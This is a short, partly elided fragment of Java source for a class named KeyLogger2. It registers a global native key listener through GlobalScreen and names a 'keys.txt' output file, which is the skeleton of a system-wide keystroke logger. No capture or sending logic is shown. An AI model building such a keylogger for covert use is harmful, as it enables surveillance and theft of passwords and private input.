 ...
 * @author vakho
 */
public class KeyLogger2 implements NativeKeyListener  {

	private static final Path file = Paths.get("keys.txt");
	private static final Logger logger = LoggerFactory.getLogger(KeyLogger2.class);
	...
	public static void main(String[] args) {
		...
		GlobalScreen.addNativeKeyListener(new KeyLogger2());
	}
